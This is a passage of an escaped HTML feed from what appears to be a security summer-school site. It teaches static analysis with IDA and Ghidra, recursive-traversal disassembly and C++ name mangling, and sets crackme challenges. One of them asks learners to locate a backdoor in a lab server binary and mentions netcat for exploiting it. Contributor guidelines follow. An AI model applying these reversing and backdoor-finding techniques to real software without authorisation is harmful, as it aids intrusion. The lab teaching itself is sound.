&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#0000cf;font-weight:bold">8048422&lt;/span>&lt;span style="color:#000;font-weight:bold">:&lt;/span> &lt;span style="color:#000">ff&lt;/span> &lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">bad&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#0000cf;font-weight:bold">8048423&lt;/span>&lt;span style="color:#000;font-weight:bold">:&lt;/span> &lt;span style="color:#000">ff&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">83&lt;/span> &lt;span style="color:#000">c4&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">10&lt;/span> &lt;span style="color:#000">b8&lt;/span> &lt;span style="color:#000">ff&lt;/span> &lt;span style="color:#000">inc&lt;/span> &lt;span style="color:#000">DWORD&lt;/span> &lt;span style="color:#000">PTR&lt;/span> &lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#000">ebx-0x47ef3c&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a40000">8048429:&lt;/span> &lt;span style="color:#000">ff&lt;/span> &lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">bad&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#0000cf;font-weight:bold">804842&lt;/span>&lt;span style="color:#000">a&lt;/span>&lt;span style="color:#000;font-weight:bold">:&lt;/span> &lt;span style="color:#000">ff&lt;/span> &lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">bad&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#0000cf;font-weight:bold">804842&lt;/span>&lt;span style="color:#000">b&lt;/span>&lt;span style="color:#000;font-weight:bold">:&lt;/span> &lt;span style="color:#000">ff&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">8&lt;/span>&lt;span style="color:#000">b&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">4&lt;/span>&lt;span style="color:#000">d&lt;/span> &lt;span style="color:#000">fc&lt;/span> &lt;span style="color:#000">c9&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">8&lt;/span>&lt;span style="color:#000">d&lt;/span> &lt;span style="color:#000">dec&lt;/span> &lt;span style="color:#000">DWORD&lt;/span> &lt;span style="color:#000">PTR&lt;/span> &lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#000">ebx-0x723603b3&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a40000">8048431:&lt;/span> &lt;span style="color:#a40000">61&lt;/span> &lt;span style="color:#000">popa&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#0000cf;font-weight:bold">8048432&lt;/span>&lt;span style="color:#000;font-weight:bold">:&lt;/span> &lt;span style="color:#000">fc&lt;/span> &lt;span style="color:#000">cld&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#0000cf;font-weight:bold">8048433&lt;/span>&lt;span style="color:#000;font-weight:bold">:&lt;/span> &lt;span style="color:#000">c3&lt;/span> &lt;span style="color:#000">ret&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>In order to avoid traps like the one showcased above, we need to use smarter disassembly techniques, such as &lt;em>Recursive Traversal&lt;/em>.&lt;/p>
&lt;h2 id="recursive-traversal">Recursive Traversal&lt;/h2>
&lt;p>Note that, in the example above, the misleading instruction is never executed. If it were, the program would crash after receiving a &lt;code>SIGILL&lt;/code> signal and after outputting &lt;code>Illegal instruction (core dumped)&lt;/code>, because the CPU would not know how to decode that particular instruction. But if we run the binary above, we notice that it doesn&amp;rsquo;t crash. So that instruction is nothing but dead code. As a result, it&amp;rsquo;s useless to us no matter what it means. And this is where &lt;em>Recursive Traversal&lt;/em> comes in.&lt;/p>
&lt;p>This strategy doesn&amp;rsquo;t start the disassembly at the beginning of the &lt;code>.text&lt;/code> section, but at the entry point (the address of the &lt;code>_start&lt;/code> symbol) and disassembles the instructions linearly, while also considering &lt;strong>jumps&lt;/strong>. Thus, when encountering code branches, the algorithm follows them and creates what&amp;rsquo;s called a &lt;strong>Control Flow Graph (CFG)&lt;/strong>, where each node is called a &lt;strong>Basic Block (BB)&lt;/strong> and is made up of instructions that are always executed in that order, regardless of conditional jumps or function calls. Take a look at the CFG below and note the BBs and the jumps that make up the arches. The code comes from the &lt;code>hyp3rs3rv3r&lt;/code> binary, which can be found &lt;a href="https://github.com/hexcellents/sss-exploit/tree/master/sessions/04-static-analysis/activities/02-tutorial-ida-time/src">here&lt;/a>. To make things harder, this executable was also stripped.
&lt;img src="assets/fork_xref_2.png" alt="CFG created by IDA">&lt;/p>
&lt;p>In conclusion, we can look at the CFG as being a DFS (recursive) traversal of the code, separated into BBs, with &lt;code>ret&lt;/code> instructions acting as &lt;em>back edges&lt;/em>.&lt;/p>
&lt;h1 id="ida-and-ghidra">IDA and Ghidra&lt;/h1>
&lt;p>The tool that we used in order to generate the image above is called &lt;a href="https://www.hex-rays.com/products/ida/support/download_freeware/">IDA&lt;/a>. Next, we&amp;rsquo;ll learn how to use it!&lt;/p>
&lt;p>We&amp;rsquo;ll showcase the functionalities of IDA by disassembling the &lt;code>hyp3rs3rv3r&lt;/code> binary. The first screen you are presented with is the following:&lt;br>
&lt;img src="assets/ida_initial_screen.png" alt="Initial IDA Screen">&lt;/p>
&lt;p>Main components:&lt;/p>
&lt;ul>
&lt;li>On the left you have the &lt;strong>Function window&lt;/strong> with the list of identified subroutines, functions or external functions called by the binary. They are color coded according to the legend right above it.&lt;/li>
&lt;li>Under it you have a graph overview of the view presented on the right.&lt;/li>
&lt;li>On the right you have multiple tabs, with the &lt;strong>Function summary&lt;/strong> selected in the IDA-view. We will not be using this. Instead, we will switch to the complete &lt;strong>Graph View&lt;/strong> of functions by pressing the spacebar. This graph is the CFG we mentioned earlier.&lt;/li>
&lt;/ul>
&lt;p>Upon pressing spacebar and navigating in the &lt;strong>Function window&lt;/strong> to functions that are not coloured (meaning they are part of this binary) we get the following view:&lt;br>
&lt;img src="assets/ida_first_view.png" alt="IDA - First View">&lt;/p>
&lt;p>When reversing binaries, we will see this particular Assembly construct a lot, as it is the standard one generated by &lt;code>gcc&lt;/code>. Remember from &lt;a href="https://github.com/hexcellents/sss-exploit/tree/master/sessions/03-executable-file-formats">Session 02&lt;/a> that &lt;a href="refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html">__libc_start_main&lt;/a> is the wrapper that calls &lt;code>main&lt;/code>. We now rename the last argument pushed on the stack to main. Press &lt;code>n&lt;/code> and enter the new name. Now you have your first function identified. Click on it to see what &lt;code>main&lt;/code> does:&lt;br>
&lt;img src="assets/ida_main.png" alt="main">&lt;/p>
&lt;p>Note how the execution is neatly layed out in the CFG view. If you look at the left panel you can see the complete view. The execution is divided because of conditional and unconditional branches. Let&amp;rsquo;s figure out what happens by analyzing the assembly code:&lt;/p>
&lt;p>First we have the function prologue, stack alignment and stack allocation:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-asm" data-lang="asm">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">push&lt;/span> &lt;span style="color:#000">ebp&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000">ebp&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">esp&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">and&lt;/span> &lt;span style="color:#000">esp&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>&lt;span style="color:#000">FFFFFFF0h&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">sub&lt;/span> &lt;span style="color:#000">esp&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">450&lt;/span>&lt;span style="color:#000">h&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Next, a variable on the stack is initialized to 1. If you click on &lt;code>434h&lt;/code> it will become highlighted and you can scroll through the whole function to see where it&amp;rsquo;s used later. We&amp;rsquo;ll ignore this for now.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-asm" data-lang="asm">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000">dword&lt;/span> &lt;span style="color:#000">ptr&lt;/span> &lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#000">esp&lt;/span>&lt;span style="color:#a40000">+&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">434&lt;/span>&lt;span style="color:#000">h&lt;/span>&lt;span style="color:#000;font-weight:bold">],&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">1&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Next, we see the first branching:&lt;/p>
&lt;pre tabindex="0">&lt;code>cmp [ebp+arg_0], 2
jz short loc_8049068
&lt;/code>&lt;/pre>&lt;hr>
&lt;p>&lt;strong>Remember!&lt;/strong>&lt;/p>
&lt;p>On 32 bit systems, &lt;code>[ebp + 0]&lt;/code> is the saved &lt;code>ebp&lt;/code>, &lt;code>[ebp + 4]&lt;/code> is the return address and &lt;code>[ebp + 8]&lt;/code> is the first argument to the current function. IDA follows a slightly different naming convention: &lt;code>[ebp + 8]&lt;/code> is named &lt;code>[ebp+arg_0]&lt;/code>. &lt;code>[ebp + 12]&lt;/code> is named &lt;code>[ebp+arg_4]&lt;/code> etc. You can rename those &lt;code>arg_*&lt;/code> constructs if you want, anyway.&lt;/p>
&lt;hr>
&lt;p>So it&amp;rsquo;s referring to the first argument: &lt;code>argc&lt;/code>. Basically, what it does is:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">if&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">argc&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">==&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">2&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span> &lt;span style="color:#000;font-weight:bold">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">goto&lt;/span> &lt;span style="color:#000">loc_8049068&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">}&lt;/span> &lt;span style="color:#204a87;font-weight:bold">else&lt;/span> &lt;span style="color:#000;font-weight:bold">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">....&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>What does the &lt;code>else&lt;/code> branch do?&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-asm" data-lang="asm">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000">eax&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#000">ebp&lt;/span>&lt;span style="color:#a40000">+&lt;/span>&lt;span style="color:#000">arg_4&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000">eax&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#000">eax&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#000">esp&lt;/span>&lt;span style="color:#a40000">+&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">4&lt;/span>&lt;span style="color:#000;font-weight:bold">],&lt;/span> &lt;span style="color:#000">eax&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000">dword&lt;/span> &lt;span style="color:#000">ptr&lt;/span> &lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#000">esp&lt;/span>&lt;span style="color:#000;font-weight:bold">],&lt;/span> &lt;span style="color:#000">offset&lt;/span> &lt;span style="color:#000">format&lt;/span> &lt;span style="color:#8f5902;font-style:italic">; &amp;#34;Usage: %s &amp;lt;banner_file&amp;gt;\n&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span>&lt;span style="color:#000">call&lt;/span> &lt;span style="color:#000">_printf&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">mov&lt;/span> &lt;span style="color:#000">dword&lt;/span> &lt;span style="color:#000">ptr&lt;/span> &lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#000">esp&lt;/span>&lt;span style="color:#000;font-weight:bold">],&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">0&lt;/span> &lt;span style="color:#8f5902;font-style:italic">; status
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span>&lt;span style="color:#000">call&lt;/span> &lt;span style="color:#000">_exit&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>It&amp;rsquo;s pretty straightforward if you remember the tasks from &lt;a href="https://github.com/hexcellents/sss-exploit/tree/master/sessions/03-executable-file-formats">Session 02&lt;/a>. The second argument (&lt;code>argv&lt;/code>) is dereferenced and pushed on the stack along with a format string. Then &lt;code>printf&lt;/code> is called. Next, &lt;code>exit&lt;/code> is called with a status of 0.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">if&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">argc&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">==&lt;/span> &lt;span style="color:#0000cf;font-weight:bold">2&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span> &lt;span style="color:#000;font-weight:bold">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#204a87;font-weight:bold">goto&lt;/span> &lt;span style="color:#000">loc_8049068&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">}&lt;/span> &lt;span style="color:#204a87;font-weight:bold">else&lt;/span> &lt;span style="color:#000;font-weight:bold">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">printf&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;%s &amp;lt;banner_file&amp;gt;&lt;/span>&lt;span style="color:#4e9a06">\n&lt;/span>&lt;span style="color:#4e9a06">&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">,&lt;/span> &lt;span style="color:#000">argv&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>&lt;span style="color:#000;font-weight:bold">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#000">exit&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#0000cf;font-weight:bold">0&lt;/span>&lt;span style="color:#000;font-weight:bold">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-weight:bold">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now let&amp;rsquo;s do something a bit more advanced: we want to identify the 2 commands that the server accepts by using static analysis. How do we approach this problem as fast as possible? We already know that the server accepts multiple clients. It can do this through forking. Let&amp;rsquo;s see where &lt;code>fork&lt;/code> is called in the program. First find the &lt;code>fork&lt;/code> function on the left panel and select it. Now you see a stub to it from the &lt;code>PLT&lt;/code> section. We want to find all locations in the program that call this function. You can achieve this by obtaining all the &lt;strong>cross-references (xrefs)&lt;/strong> to it by pressing &lt;code>x&lt;/code>. You should get the following screen:&lt;br>
&lt;img src="assets/fork_xref_1.png" alt="fork cross-references 1">&lt;/p>
&lt;p>Click that location and you will get to the forking point:&lt;br>
&lt;img src="assets/fork_xref_2.png" alt="fork cross-references 2">&lt;/p>
&lt;p>You can see that the return value is stored on the stack at &lt;code>[esp+438h]&lt;/code>, some error checking (&lt;code>perror&lt;/code> and &lt;code>exit&lt;/code>) is done and then the return value is checked for 0 (as we traditionally do for &lt;code>fork&lt;/code> calls). The child will execute &lt;code>sub_8048ED7&lt;/code> and the parent will loop back. You can rename &lt;code>sub_8048ED7&lt;/code> to something more legible such as &lt;code>handle_child_process&lt;/code>
In this function you can now clearly see the two commands and which function is called for each:&lt;br>
&lt;img src="assets/handle_child_process.png" alt="handle_child_process">&lt;/p>
&lt;p>It looks like the one on the left, &lt;code>sub_8048B0B&lt;/code> handles the &lt;code>LIST&lt;/code> command so we rename it to &lt;code>handle_LIST&lt;/code>. As expected, it calls &lt;code>opendir&lt;/code> and &lt;code>readdir&lt;/code> to read all the files in the current directory, then writes them to the socket.&lt;br>
&lt;img src="assets/handle_LIST.png" alt="handle_LIST">&lt;/p>
&lt;h2 id="ida-tips--tricks">IDA tips &amp;amp; tricks&lt;/h2>
&lt;ul>
&lt;li>Saving progress is disabled for the trial version. However, you can save a limited (but useful) subset of your work using &lt;code>File -&amp;gt; Produce File -&amp;gt; Dump database to IDC file&lt;/code> and then load it next time using &lt;code>File -&amp;gt; Script File&lt;/code>.&lt;/li>
&lt;li>If you close some windows and don&amp;rsquo;t know how to get them back you can reset the layout using &lt;code>Windows-&amp;gt;Reset Desktop&lt;/code>.&lt;/li>
&lt;li>If you want to return to the previous view you can press &lt;code>Escape&lt;/code>.&lt;/li>
&lt;li>When you want to view code as in &lt;code>objdump&lt;/code> you only need to press &lt;code>Spacebar&lt;/code> once. And then again to return to CFG mode.&lt;/li>
&lt;li>If there is a hex value and you want to convert it to decimal (or back) press &lt;code>h&lt;/code>.&lt;/li>
&lt;li>Converting hex/dec values to &lt;em>ASCII&lt;/em>: press &lt;code>r&lt;/code>.&lt;/li>
&lt;li>If you want to write comments next to an instruction or a function press &lt;code>:&lt;/code>.&lt;/li>
&lt;/ul>
&lt;h2 id="ida-pro-and-ghidra">IDA Pro and Ghidra&lt;/h2>
&lt;p>IDA Pro is installed on the Kali virtual machine. The main difference between it and the free version is that the Pro one can also &lt;strong>decompile&lt;/strong> the code based on the CFGs listed above. This will come in extremely useful as we hack more and more binaries.&lt;/p>
&lt;p>Another tool that is capable of decompiling the code in an executable is &lt;a href="https://ghidra-sre.org/">Ghidra&lt;/a>. One advantage of Ghidra over IDA is that Ghidra displays both the C and the Assembly code side by side. This allows us to correlate the two and reap the benefits of both of them at the same time.&lt;/p>
&lt;h1 id="c">C++&lt;/h1>
&lt;p>Things look slightly different when we try to hack executables that have been compiled from C++ code, instead of C. The difference comes from the way symbols (method symbols in particular) are handled by C++ compilers. Let&amp;rsquo;s disassemble the code below and see how its symbols look:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-code" data-lang="code">#include &amp;lt;iostream&amp;gt;
using namespace std;
int main()
{
cout &amp;lt;&amp;lt; &amp;#34;Hello world&amp;#34; &amp;lt;&amp;lt; endl;
return 0;
}
&lt;/code>&lt;/pre>&lt;p>Disassembling it in IDA looks familiar at first
&lt;img src="assets/ida_c%2B%2B_start.png" alt="IDA _start">&lt;/p>
&lt;p>But then the fun starts:
&lt;img src="assets/ida_c%2B%2B_main.png" alt="IDA main">&lt;/p>
&lt;p>As we can see, all symbols look almost as if they were encrypted. In fact, this process is called &lt;strong>name mangling&lt;/strong>. If we take a closer look at them, however, we can distinguish some clues about those function calls, for example. The first one contains the sequences &lt;code>char_traits&lt;/code> and &lt;code>basic_ostream&lt;/code>, the former being a C++ abstraction for string operations, while the latter is a base class for output operators, such as &lt;code>&amp;lt;&amp;lt;&lt;/code>.&lt;/p>
&lt;p>IDA can demangle strings such as the ones above by itself. Some recommended settings (you may prefer something different) are the following:&lt;/p>
&lt;ul>
&lt;li>&lt;code>Options -&amp;gt; Demangled names&lt;/code>&lt;/li>
&lt;li>Show demangled C++ names as &lt;code>Names&lt;/code>&lt;/li>
&lt;li>&lt;code>Setup short names&lt;/code>&lt;/li>
&lt;li>Click &lt;code>Only main name&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>These settings only display the important classes and namespaces that make up each method, like this:&lt;br>
&lt;img src="assets/ida_c%2B%2B_demangled.png" alt="IDA demangled">&lt;/p>
&lt;h1 id="further-reading">Further reading&lt;/h1>
&lt;p>More information about name mangling can be obtained at:&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://en.wikipedia.org/wiki/Name_mangling">https://en.wikipedia.org/wiki/Name_mangling&lt;/a>&lt;/li>
&lt;li>on demand demangling: &lt;a href="http://demangler.com/">http://demangler.com/&lt;/a> or c++filt&lt;/li>
&lt;/ul>
&lt;p>You can find out more information about the internals of C++ in general, using the following references:&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://ocw.cs.pub.ro/courses/cpl/labs/06">https://ocw.cs.pub.ro/courses/cpl/labs/06&lt;/a> (in Romanian)&lt;/li>
&lt;li>&lt;a href="https://www.blackhat.com/presentations/bh-dc-07/Sabanal_Yason/Paper/bh-dc-07-Sabanal_Yason-WP.pdf">https://www.blackhat.com/presentations/bh-dc-07/Sabanal_Yason/Paper/bh-dc-07-Sabanal_Yason-WP.pdf&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://www.hexblog.com/wp-content/uploads/2011/08/Recon-2011-Skochinsky.pdf">http://www.hexblog.com/wp-content/uploads/2011/08/Recon-2011-Skochinsky.pdf&lt;/a>&lt;/li>
&lt;/ul>
&lt;h1 id="challenges">Challenges&lt;/h1>
&lt;h2 id="04-crypto_crackme">04. crypto_crackme&lt;/h2>
&lt;p>The &lt;code>crypto_crackme&lt;/code> binary is an application that asks for a secret and uses it to decrypt a message. In order to solve this task, you have to retrieve the message.&lt;/p>
&lt;ul>
&lt;li>Open the binary using IDA and determine the program control flow. What is it doing after fetching the secret? It seems to be consuming a lot of CPU cycles. If possible, use IDA to patch the program and reduce the execution time of the application. Use &amp;lsquo;&amp;lsquo;Edit -&amp;gt; Patch program -&amp;gt; Change byte&amp;hellip;&amp;rsquo;&amp;rsquo;&lt;/li>
&lt;li>Next, it looks like the program tries to verify if the secret provided is correct. Where is the secret stored? Is it stored in plain text? Find out what the validation algorithm is.&lt;/li>
&lt;li>Now break it and retrieve the message!&lt;/li>
&lt;/ul>
&lt;hr>
&lt;p>&lt;strong>Important!&lt;/strong>&lt;/p>
&lt;p>Unfortunately, the virtual machine doesn&amp;rsquo;t support the libssl1.0.0 version of SSL library. Use the library files in the task archive and run the executable using:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">LD_LIBRARY_PATH&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span>. ./crypto_crackme
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>You can break password hashes (including SHA1) on &lt;a href="https://crackstation.net/">CrackStation&lt;/a>.&lt;/p>
&lt;hr>
&lt;h2 id="05-broken">05. broken&lt;/h2>
&lt;p>The &lt;code>broken&lt;/code> binary is asking you for the correct password. Investigate the binary and provide it with the correct password. If you provided the correct password the message &lt;code>%%That's correct! The password is '...'%%&lt;/code>.&lt;/p>
&lt;h2 id="06-hyp3rs3rv3r">06. hyp3rs3rv3r&lt;/h2>
&lt;p>Investigate the &lt;code>hyp3rs3rv3r&lt;/code> binary and find out where the backdoor function is. Note that since it&amp;rsquo;s not directly called, IDA doesn&amp;rsquo;t think of it as a procedure, so it won&amp;rsquo;t come up on the left pane. Figure out a way around this. When you find that code block you can press &lt;code>p&lt;/code> on the first instruction to help IDA see it as a procedure.&lt;/p>
&lt;details>
&lt;summary>Tip&lt;/summary>
&lt;p>In order to exploit the vulnerability in Ubuntu, you should use netcat-traditional. You can switch from netcat-openbsd to netcat-traditional using the steps described &lt;a href="https://stackoverflow.com/questions/10065993/how-to-switch-to-netcat-traditional-in-ubuntu">here&lt;/a>.&lt;/p>
&lt;/details></description></item><item><title>Docs: Contributor guidelines</title><link>/docs/contribution-guidelines/contributor-guideline/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/contribution-guidelines/contributor-guideline/</guid><description>
&lt;h2 id="first-steps">First Steps&lt;/h2>
&lt;p>Some good first steps and best practices when using Git are explained here:&lt;/p>
&lt;ul>
&lt;li>the Git Immersion tutorial: &lt;a href="https://gitimmersion.com/">https://gitimmersion.com/&lt;/a>&lt;/li>
&lt;li>the Atlassian tutorial: &lt;a href="https://www.atlassian.com/git/tutorials/learn-git-with-bitbucket-cloud">https://www.atlassian.com/git/tutorials/learn-git-with-bitbucket-cloud&lt;/a>&lt;/li>
&lt;li>this blog post on the ROSEdu Techblog: &lt;a href="https://techblog.rosedu.org/git-good-practices.html">https://techblog.rosedu.org/git-good-practices.html&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="language">Language&lt;/h2>
&lt;p>All of our content is developed in English.
This means we use English for content, support code, commit messages, pull requests, issues, comments, everything.&lt;/p>
&lt;h2 id="content-writing-style">Content Writing Style&lt;/h2>
&lt;p>This section addresses the development of session content and other Markdown files.&lt;/p>
&lt;ul>
&lt;li>Write each sentence on a new line. This way, changing one sentence only affects one line in the source code.&lt;/li>
&lt;li>Use the &lt;strong>first person plural&lt;/strong> when writing documentation and tutorials.&lt;/li>
&lt;li>Use phrases like &lt;code>we run the command / app&lt;/code>, &lt;code>we look at the source code&lt;/code>, &lt;code>we find the flag&lt;/code>.&lt;/li>
&lt;li>Use the second person for challenges and other individual activities.&lt;/li>
&lt;li>Use phrases like &lt;code>find the flag&lt;/code>, &lt;code>run this command&lt;/code>, &lt;code>download the tool&lt;/code>.&lt;/li>
&lt;/ul>
&lt;h2 id="issues">Issues&lt;/h2>
&lt;p>When opening an issue, please clearly state the problem.&lt;/p>
&lt;ul>
&lt;li>Make sure it&amp;rsquo;s reproducible.&lt;/li>
&lt;li>Add images if required.&lt;/li>
&lt;li>Also, if relevant, detail the environment you used (OS, software versions).&lt;/li>
&lt;li>Ideally, if the issue is something you could fix, open a pull request with the fix.&lt;/li>
&lt;/ul>
&lt;h2 id="discussions">Discussions&lt;/h2>
&lt;p>Use Github discussions for bringing up ideas on content, new chapters, new sections.&lt;/p>
&lt;ul>
&lt;li>Provide support to others asking questions and take part in suggestions brought by others.&lt;/li>
&lt;li>For in-depth discussions, please join the &lt;a href="https://bit.ly/DiscordSecuritySummerSchool">SSS Discord community&lt;/a>.&lt;/li>
&lt;li>Please be civil when taking part in discussions.&lt;/li>
&lt;/ul>
&lt;h2 id="pull-requests">Pull Requests&lt;/h2>
&lt;p>For pull requests, please follow the &lt;a href="https://docs.github.com/en/github/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request-from-a-fork">GitHub flow&lt;/a>: create a fork of the repository, create your own branch, do commits, push changes to your branch, do a pull request (PR).&lt;/p>
&lt;ul>
&lt;li>The destination branch of pull requests is the default &lt;code>master&lt;/code> branch.&lt;/li>
&lt;li>Make sure each commit corresponds to &lt;strong>one&lt;/strong> code / content change only.&lt;/li>
&lt;li>Also make sure one pull request covers only &lt;strong>one&lt;/strong> topic.&lt;/li>
&lt;li>How a good commit message should look like: &lt;a href="https://cbea.ms/git-commit/">https://cbea.ms/git-commit/&lt;/a>.&lt;/li>
